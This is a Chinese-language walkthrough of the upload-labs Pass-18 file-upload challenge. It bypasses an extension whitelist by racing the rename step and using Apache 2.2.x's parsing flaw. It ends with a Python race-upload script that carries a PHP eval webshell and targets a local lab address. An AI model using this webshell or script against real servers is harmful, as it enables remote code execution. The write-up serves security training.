# 需在apache2.2.x环境下通过解析+条件竞争绕过

这里采用复制一下大佬的wp



apache2.4.x的环境下暂时还未找到绕过方法，在apache2.2.x的环境下可以通过条件竞争加上apache2.2.x解析漏洞去绕过，这一关的要求是上传一个webshell到服务器，题目提示说需要代码审计，那么首先来看代码：

重要代码部分如下：

```javascript
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload($UPLOAD_ADDR);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}
```

分析一下代码的执行过程，首先使用$_FILES['upload_file']['name']接收文件名，然后获取文件后缀名进行白名单检查，需要注意的是这里使用的strrchr函数去截取后缀名的，所以获取到的是最后一个点后面的后缀名。如果后缀名不在白名单内的话就会提示上传失败，否则就会将文件使用rename函数重命名后上传至指定的目录，比如上传的是shell.php.xxx,shell.php会被重命名，导致最终文件命名变为xxxx.jpg而无法解析，所以这里同样需要使用竞争上传的方式，在重命名之前将文件上传至服务器，之后再结合apache2.2.x的解析漏洞使文件被解析，所以这里可以构造文件名为shell.php.7z

贴出我写的上传脚本

```javascript
#coding=utf-8
import requests
from multiprocessing import Pool
def CompeteUpload(list):
    url="http://192.168.233.130:8080/upload-labs/Pass-18/index.php"
    geturl="http://192.168.233.130:8080/upload-labs/upload/info.php"
    file={'upload_file':('shell.php.7z',"<?php @eval($_POST['c1imber']);?>",'image/jpeg')}
    data={'submit':'上传'}
    r=requests.post(url=url,data=data,files=file)
    #print "test upload...."
    r1=requests.get(url=geturl)
    if r1.status_code==200:
        print "upload success!"
if __name__=="__main__":
    pool = Pool(10)
    pool.map(CompeteUpload, range(10000))
    pool.close()
    pool.join()
```

